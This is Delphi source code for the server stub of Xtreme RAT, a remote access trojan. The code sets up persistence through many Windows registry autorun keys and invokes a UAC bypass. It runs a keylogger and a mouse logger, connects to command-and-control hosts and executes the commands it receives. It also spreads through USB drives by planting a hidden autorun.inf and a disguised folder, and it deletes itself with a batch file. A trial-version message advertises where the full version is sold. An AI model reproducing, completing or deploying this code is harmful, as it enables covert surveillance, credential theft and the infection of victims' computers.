{ KOL MCK } // Do not remove this line!
{$DEFINE KOL_MCK}
program servidor;
{$imagebase 23140000}
{$SETPEOPTFLAGS $010}
{$I Compilar.inc}

uses
KOL,
UnitGetAccType,
  StrUtils,
  uDEP,Unit2,
  UnitStartWebcam,
  Windows,
  Messages,
  IdCmdTCPClient,
  GlobalVars,
  ShellAPI,
  UnitConfigs,
  UnitCryptString,
  UnitFuncoesDiversas,
  UnitInformacoes,
  UnitConexao,
  UnitKeylogger,
  USB,
  UnitObjeto,
  UnitExecutarComandos,
  Classes,
  UnitShell,
  UnitChat,
  UnitConstantes,
  TlHelp32,
  PsAPI,
  SafariPasswordRecovery,
  IdGlobal;

function IsWinXP: Boolean;
var
  osv: TOSVERSIONINFO;
begin
  osv.dwOSVersionInfoSize := sizeOf(OSVERSIONINFO);
  GetVersionEx(osv);
  //   result := ( osv.dwPlatformId = VER_PLATFORM_WIN32_NT );
  Result := (osv.dwMajorVersion > 5) or ((osv.dwMajorVersion = 5) and
    (osv.dwMinorVersion >= 1));
end;

Procedure CriarArquivoUSB(NomedoArquivo: pWideChar; Buffer: pWideChar; Size: int64);
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;
  unicode: array [0..1] of byte;
begin
  hFile := CreateFileW(NomedoArquivo, GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    unicode[0] := $FF;
    unicode[1] := $FE;
    WriteFile(hFile, unicode, sizeof(unicode), lpNumberOfBytesWritten, nil);
    WriteFile(hFile, Buffer[0], Size, lpNumberOfBytesWritten, nil);
  end;

  CloseHandle(hFile);
end;

procedure SelfDelete;
var
  f: TextFile;
  s: WideString;
begin
  s := MyTempFolder + 'SelfDelete.bat';
  assignFile(f, s);
  rewrite(f);
  writeln(f, ':f');
  writeln(f, 'attrib -A -S -H "' + ParamStr(0) + '"');
  writeln(f, 'del "' + ParamStr(0) + '"');
  writeln(f, 'if EXIST "' + ParamStr(0) + '" goto f');
  writeln(f, 'del "' + s + '"');
  writeln(f, 'del %0');
  closefile(f);
  ShellExecuteW(0, 'open', pWideChar(s), nil, pWideChar(ExtractFilePath(s)), SW_HIDE);
end;

procedure DesinstalarServidor;
var
  TempSubKey, TempKey: WideString;
  Key: HKEY;
begin
  CreateMutexW(nil, False, ConfiguracoesServidor.MutexSair);

  if ConfiguracoesServidor.Mutex <> '' then DeletarChave(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex);

  if ConfiguracoesServidor.HKLMRunBool = true then
  DeletarRegistro(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', ConfiguracoesServidor.HKLMRun);

  if ConfiguracoesServidor.HKCURunBool = true then
  DeletarRegistro(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', ConfiguracoesServidor.HKCURun);

  if ConfiguracoesServidor.ActiveXBool = true then
  DeletarChave(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Active Setup\Installed Components\' + ConfiguracoesServidor.ActiveX);

  if ConfiguracoesServidor.RunOnceBool = true then
  begin
    DeletarRegistro(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\RunOnce', ConfiguracoesServidor.MoreStartUpName);
    DeletarRegistro(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\RunOnce', ConfiguracoesServidor.MoreStartUpName);
  end;

  if ConfiguracoesServidor.WinLoadBool = true then
  begin
    DeletarRegistro(HKEY_CURRENT_USER, 'Software\Microsoft\Windows NT\CurrentVersion\Windows', 'Load');
    DeletarRegistro(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion\Windows', 'Load');
  end;

  if ConfiguracoesServidor.WinShellBool = true then
  begin
    DeletarRegistro(HKEY_CURRENT_USER, 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'Shell');
    DeletarRegistro(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'Shell');
  end;

  if ConfiguracoesServidor.RunPolicies = true then
  begin
    DeletarRegistro(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run', ConfiguracoesServidor.MoreStartUpName);
    DeletarRegistro(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run', ConfiguracoesServidor.MoreStartUpName);
  end;

  DeletarChave(HKEY_CURRENT_USER, 'Software\FakeMessage');
  StopKey;
  SetFileAttributesW(KeyloggerFileName, FILE_ATTRIBUTE_NORMAL);
  SetFileAttributesW(PWideChar(FunctionsFileName), FILE_ATTRIBUTE_NORMAL);
  SetFileAttributesW(PWideChar(ServerConfigFileName), FILE_ATTRIBUTE_NORMAL);
  deletefilew(KeyloggerFileName);
  deletefilew(pWideChar(FunctionsFileName));
  deletefilew(pWideChar(ServerConfigFileName));
  DeleteFileW(pWideChar(ExtractFilePath(InstalledServer) + 'rar.exe'));
  DeleteFileW(pWideChar(ExtractFilePath(InstalledServer) + 'rarreg.key'));

  sleep(5000); // tempo de intervalo do persist

  if InstalledServer <> ParamStr(0) then
  begin
    SetFileAttributesW(pWideChar(InstalledServer), FILE_ATTRIBUTE_NORMAL);
    SetFileAttributesW(pWideChar(ExtractFilePath(InstalledServer)), FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(pWideChar(InstalledServer));
  end else
  begin
    SelfDelete;
  end;
end;

function GetProcessParentPID: Cardinal;
var
  PE32: TProcessEntry32;
  snap: THandle;
  Temp: cardinal;
begin
  Result := 0;
  Temp := GetCurrentProcessID;
  snap := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  PE32.dwSize := SizeOF(PE32);
  process32first(snap, PE32);
  repeat
    if PE32.th32ProcessID = Temp then
    begin
      Result := Pe32.th32ParentProcessID;
      Break;
    end;
  until Process32Next(snap, PE32) = FALSE;
end;

procedure WriteRestartSettings(Config: TConfiguracoes; Server: pWideChar);
  function StrLen(const Str: PWideChar): Cardinal;
  asm
    {Check the first byte}
    cmp word ptr [eax], 0
    je @ZeroLength
    {Get the negative of the string start in edx}
    mov edx, eax
    neg edx
  @ScanLoop:
    mov cx, word ptr [eax]
    add eax, 2
    test cx, cx
    jnz @ScanLoop
    lea eax, [eax + edx - 2]
    shr eax, 1
    ret
  @ZeroLength:
    xor eax, eax
  end;
  function SomarPWideChar(p1, p2: pWideChar): pWideChar;
  var
    i: integer;
  begin
    i := (StrLen(p1) * 2) + (StrLen(p2) * 2);
    Result := VirtualAlloc(nil, i, MEM_COMMIT, PAGE_READWRITE);
    CopyMemory(pointer(integer(Result)), p1, StrLen(p1) * 2);
    CopyMemory(pointer(integer(Result) + (StrLen(p1) * 2)), p2, StrLen(p2) * 2);
  end;
const
  SoftRun = 'Software\Microsoft\Windows\CurrentVersion\Run';
  RunOnce = 'Software\Microsoft\Windows\CurrentVersion\RunOnce';
  WinLoad = 'Software\Microsoft\Windows NT\CurrentVersion\Windows';
  WinShell = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon';
  Policies = 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run';
  InstallComp = 'Software\Microsoft\Active Setup\Installed Components\';
begin
  if Config.Restart = False then exit;

  if Config.HKLMRunBool = true then
  Write2Reg(HKEY_LOCAL_MACHINE, SoftRun, Config.HKLMRun, Server);

  if Config.HKCURunBool = true then
  Write2Reg(HKEY_CURRENT_USER, SoftRun, Config.HKCURun, Server);

  if Config.ActiveXBool = true then
  begin
    DeletarChave(HKEY_CURRENT_USER, SomarpWideChar(InstallComp, Config.ActiveX));
    Write2Reg(HKEY_LOCAL_MACHINE, SomarpWideChar(InstallComp, Config.ActiveX), 'StubPath', SomarpWideChar(Server, ' restart'));
  end;

  if Config.MoreStartUp = False then Exit;

  if Config.RunOnceBool = true then
  begin
    Write2Reg(HKEY_LOCAL_MACHINE, RunOnce, Config.MoreStartUpName, Server);
    Write2Reg(HKEY_CURRENT_USER, RunOnce, Config.MoreStartUpName, Server);
  end;

  if Config.WinLoadBool = true then
  begin
    Write2Reg(HKEY_LOCAL_MACHINE, WinLoad, 'Load', Server);
    Write2Reg(HKEY_CURRENT_USER, WinLoad, 'Load', Server);
  end;

if Config.WinShellBool = true then
  begin
   if IsWinXP = false then
   begin
    Write2Reg(HKEY_LOCAL_MACHINE, WinShell, 'Shell', pWideChar( server));
    Write2Reg(HKEY_CURRENT_USER, WinShell, 'Shell', pWideChar( server));
    if  IsWinXP = true then
   begin
    Write2Reg(HKEY_LOCAL_MACHINE, WinShell, 'Shell', SomarpWideChar('explorer.exe ', server));
    Write2Reg(HKEY_CURRENT_USER, WinShell, 'Shell', SomarpWideChar('explorer.exe ', server))
   end;
  end;
  end;

  if Config.RunPolicies = true then
  begin
    Write2Reg(HKEY_LOCAL_MACHINE, Policies, Config.MoreStartUpName, Server);
    Write2Reg(HKEY_CURRENT_USER, Policies, Config.MoreStartUpName, Server);
  end;
end;

procedure EscreverRestart;
begin
  sleep(5000);
  WriteRestartSettings(ConfiguracoesServidor, pWideChar(InstalledServer));
end;

procedure ExecutarConfiguracoesIniciais;
var
  p: pointer;
  size: int64;
  MutexName: WideString;
  PC, User, TempStr: WideString;
  ParentPID: cardinal;
begin
  ParentPID := GetProcessParentPID;
  MutexName := LerReg(HKEY_CURRENT_USER, 'SOFTWARE\' + IntToStr(ParentPID), 'Mutex', '');
  DeletarChave(HKEY_CURRENT_USER, 'SOFTWARE\' + IntToStr(ParentPID));
  if MutexName = '' then ExitProcess(0);

  CreateMutexW(nil, False, pWideChar(MutexName));

  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    ExitProcess(0);
  end;

  if ForceDirectories(pWideChar(GetAppDataDir + '\Microsoft\Windows\')) = True then
  begin
    TempStr := GetAppDataDir + '\Microsoft\Windows\' + MutexName + '.dat';
    GetMem(KeyloggerFileName, MAX_PATH * 2);
    CopyMemory(KeyloggerFileName, @TempStr[1], Length(TempStr) * 2);
    ServerConfigFileName := GetAppDataDir + '\Microsoft\Windows\' + MutexName + '.cfg';
    FunctionsFileName := GetAppDataDir + '\Microsoft\Windows\' + MutexName + '.xtr';
  end else
  begin
    TempStr := GetAppDataDir + '\' + MutexName + '.dat';
    GetMem(KeyloggerFileName, MAX_PATH * 2);
    CopyMemory(KeyloggerFileName, @TempStr[1], Length(TempStr) * 2);
    ServerConfigFileName := GetAppDataDir + '\' + MutexName + '.cfg';
    FunctionsFileName := GetAppDataDir + '\' + MutexName + '.xtr';
  end;

  Size := LerArquivo(pWideChar(ServerConfigFileName), p);
  EnDecryptStrRC4B(p, Size, 'CONFIG');

  HideFileName(ServerConfigFileName);
  CopyMemory(@ConfiguracoesServidor, p, Size);
  KeyloggerConfig := ConfiguracoesServidor;

  InstalledServer := LerReg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'InstalledServer', '');
  ServerStarted := LerReg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'ServerStarted', '');

  DiskSerialName := ExtractDiskSerial(myrootfolder);
  PassID := DiskSerialName ;
  PC := GetPCName;
  User := GetPCUser;

  StartThread(@EscreverRestart, nil);

 if (ValidarString(Pc) <> '') and (ValidarString(User) <> '') then DiskSerialName := PC + '^' + User + '(' + DiskSerialName + ')';
end;

type
  TIniciarConexao = class(TThread)
  private

  protected
    procedure Execute; override;
  public
    constructor Create;
  end;

constructor TIniciarConexao.Create;
begin
  inherited Create(True);
end;

procedure TIniciarConexao.Execute;
var
  ConexaoAtual: integer;
  TempStr: String;
begin
  ConexaoAtual := 0;
  IniciarDesinstalacao := False;

  while 1 < 2 do
  begin
    MainIdTCPClient := TIdTCPClientNew.Create(nil, ConfiguracoesServidor.Password);

    ProcessMessages;
    OnlineKeylogger := False;
    if ConexaoAtual > High(ConfiguracoesServidor.DNS) then ConexaoAtual := 0;
    if (ConfiguracoesServidor.DNS[ConexaoAtual] <> '') and (ConfiguracoesServidor.Ports[ConexaoAtual] <> 0) then
    try
      {$IFDEF XTREMETRIAL}
   	    MainIdTCPClient.Host := '127.0.0.1';
        MainIdTCPClient.Port := 81;
      {$ELSE}
      if ReconectarServer = true then
      begin
        ReconectarServer := False;
   	    MainIdTCPClient.Host := PAnsiChar(PAnsiString(AnsiString(ReconectarServerHost)));
        MainIdTCPClient.Port := ReconectarServerPort;
      end else
      begin
   	    MainIdTCPClient.Host := PAnsiChar(PAnsiString(AnsiString(ConfiguracoesServidor.DNS[ConexaoAtual])));
        MainIdTCPClient.Port := ConfiguracoesServidor.Ports[ConexaoAtual];
      end;
      {$ENDIF}

      try
        DesconectarServidor := False;
        Lastping := GetTickCount;
        MainIdTCPClient.Connect;
        MainIdTCPClient.Socket.UseNagle := False;

        if MainIdTCPClient.Connected then
          MainIdTCPClient.IOHandler.WriteLn(MYVERSION + '|' + ConfiguracoesServidor.Versao);

        while DesconectarServidor = False do
        try
          if MainIdTCPClient.Connected then
          begin
            ProcessMessages;
            TempStr := MainIdTCPClient.ReceberString;

            if TempStr <> '' then ExecutarComando(TempStr);

            if GetTickCount > Lastping + 60000 then
            begin
              //Messagebox(0, 'Dont received PING', '', MB_OK or MB_ICONERROR);
              DesconectarServidor := True;
              if MainIdTCPClient.IOHandler.InputBufferIsEmpty = False then
                MainIdTCPClient.IOHandler.InputBuffer.Clear;
              MainIdTCPClient.IOHandler.Close;
            end;

            if IniciarDesinstalacao = True then
            begin
              DesinstalarServidor;
              ExitProcess(0);
            end;

            ProcessMessages;
          end else DesconectarServidor := True;
          finally
          if DesconectarServidor = True then try MainIdTCPClient.Disconnect; except end;
        end;
        except // Failed during transfer
      end;
      except // Couldn't even connect
    end;
    ComandoShell := 'exit' + #13#10;
    Inc(ConexaoAtual);

    if FormChat.Form.Visible then FormChat.Form.Visible := False;
    ProcessMessages;

    try
      MainIdTCPClient.Disconnect;
      except
    end;

    MainIdTCPClient.Free;
    MainIdTCPClient := nil;

    Sleep(1000);
  end;
end;

procedure IniciarObjetoServer;
var
  s: WideString;
begin
  s := 'XtremeServer';
  ServerObject := TMyObject.Create(pWideChar(s), @ServerWindowProc);
  ServerWindow := ServerObject.Handle;
  ShowWindow(ServerObject.Handle, SW_HIDE);
end;

function ExtractFileNameUSB(FileName: WideString): WideString;
begin
  Result := FileName;
  if posex('\', FileName) <= 0 then Exit;
  while posex('\', FileName) > 0 do Delete(FileName, 1, posex('\', FileName));
  Result := FileName;
end;

type
  TUSBMain = class
    ServerFileName: WideString;
    //procedure usbDisConnect(AObject : TObject; ADriverName: Widestring);
    procedure usbConnect(AObject : TObject; ADriverName: Widestring);
  end;

var
  USBClass: TUsbClass;

{
procedure TUSBMain.usbDisConnect(AObject : TObject; ADriverName: Widestring);
begin
  messagebox(0, pchar('Disconnect Usb: ' + ADriverName), '', 0);
end;
}
procedure TUSBMain.usbConnect(AObject : TObject; ADriverName: WideString);
var
  TempDir: WideString;
  TempStr: WideString;
begin
  //MessageboxW(0, pWchar('Connect Usb: ' + ADriverName), '', 0);
  TempDir := ADriverName + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\';
  if ForceDirectories(pWideChar(TempDir)) = False then Exit;

  CopyFileW(pWchar(serverfilename), pWchar(TempDir + ExtractFileNameUSB(serverfilename)), false);
  TempStr := '[autorun]' + #13#10 +
             ';open=' + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\' + ExtractFileNameUSB(serverfilename) + #13#10 +
             'icon=shell32.dll,4' + #13#10 +
             'shellexecute=' + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\' + ExtractFileNameUSB(serverfilename) + #13#10 +
             'label=PENDRIVE' + #13#10 +
             'action=Open folder to view files' + #13#10 +
             'shell\Open=Open' + #13#10 +
             'shell\Open\command=' + 'RECYCLER\S-1-5-21-1482476501-3352491937-682996330-1013\' + ExtractFileNameUSB(serverfilename) + #13#10 +
             'shell\Open\Default=1';
   CriarArquivoUSB(pWideChar(ADriverName + 'autorun.inf'), pWideChar(tempstr), length(tempstr) * 2);

   HideFileName(ADriverName + 'autorun.inf');
   HideFileName(ADriverName + 'RECYCLER\');
   HideFileName(TempDir);
   HideFileName(TempDir + ExtractFileNameUSB(serverfilename));
end;

procedure StartUSBSpreader(ServerFileName: WideString);
var
  Msg: TMsg;
  Main: TUSBMain;
begin
  Main := TUSBMain.Create;
  Main.ServerFileName := ServerFileName;
  USBClass := TUsbClass.Create;
  USBClass.OnUsbInsertion := Main.usbConnect;
  //USBClass.OnUsbRemoval := Main.usbDisConnect;

  while GetMessage(msg, 0, 0, 0) do
  begin
    TranslateMessage(msg);
    DispatchMessage(msg);
  end;

  Main.Free;
end;

type
  TUSBSpreader = class(TThread)
  private
    ServerFileName: WideString;
  protected
    procedure Execute; override;
  public
    constructor Create(xServerFileName: WideString);
  end;

constructor TUSBSpreader.Create(xServerFileName: WideString);
begin
  ServerFileName := xServerFileName;
  inherited Create(True);
end;

procedure TUSBSpreader.Execute;
begin
  StartUSBSpreader(ServerFileName);
end;

procedure IniciarUSBSpreader(ServerFileName: WideString);
var
  USBSpreader: TUSBSpreader;
begin
  USBSpreader := TUSBSpreader.Create(ServerFileName);
  USBSpreader.Resume;
end;

procedure StartMouseLogger;
var
  TempStr: WideString;
begin
  if LerReg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'MouseLogger', '') = 'True' then
  begin
    RelacaoJanelas := LerReg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'MouseLoggerWindows', '');
    TempStr := ExtractFilePath(InstalledServer) + 'MouseCap\';
    if ForceDirectories(pWideChar(TempStr)) = False then TempStr := ExtractFilePath(InstalledServer) else
    HideFileName(TempStr);
    MouseFolder := TempStr;

    SendMessage(ServerObject.Handle, WM_MOUSELOGGERSTART, 0, 0);
  end;
end;

{$IFDEF XTREMETRIAL}
type
  TTrial = class(TThread)
  private

  protected
    procedure Execute; override;
  public
    constructor Create;
  end;

constructor TTrial.Create;
begin
  inherited Create(True);
end;

procedure TTrial.Execute;
begin
  while true do
  begin
    MessageBox(0, 'This is a trial version of Xtreme RAT.' + #13#10 +
                  'This server will connect to localhost (127.0.0.1) port 81' + #13#10 +
                  'If you want to buy a full version, go to http://sites.google.com/site/nxtremerat/' + #13#10 +
                  'or send a email to newxtremerat@gmail.com or xtremerat@hotmail.com', 'Xtreme RAT',
                  MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    sleep(5000);
  end;
end;
{$ENDIF}

var
  TempMutex: Cardinal;
  IniciarConexao: TIniciarConexao;
  {$IFDEF XTREMETRIAL}
  Trial: TTrial;
  {$ENDIF}
// Apagar as merdas das linhas "{$IF Defined(KOL_MCK)} {$I Servidor_0.inc} {$ELSE}" e "{$IFEND}"
// que são geradas automaticamente após realizar alterações nos forms KOL
begin // PROGRAM START HERE -- Please do not remove this comment
  ExecutarConfiguracoesIniciais;
  if Is64BitOS  then  uacbypass;

  WebcamType := 0;

  {$IFDEF XTREMETRIAL}
  Trial := TTrial.Create;
  Trial.Resume;
  {$ENDIF}

  IniciarConexao := TIniciarConexao.Create;
  IniciarConexao.Resume;
  ServerFirstRun := True;
  if ConfiguracoesServidor.ActiveKeylogger = True then StartKey;
  if ConfiguracoesServidor.USBSpreader = True then IniciarUSBSpreader(InstalledServer);
  IniciarObjetoServer;
  StartMouseLogger;
  {$IF Defined(KOL_MCK)} {$I Servidor_0.inc}{$IFEND}
  while true do
  begin
    sleep(10);
    ProcessMessages;
  end;

end.

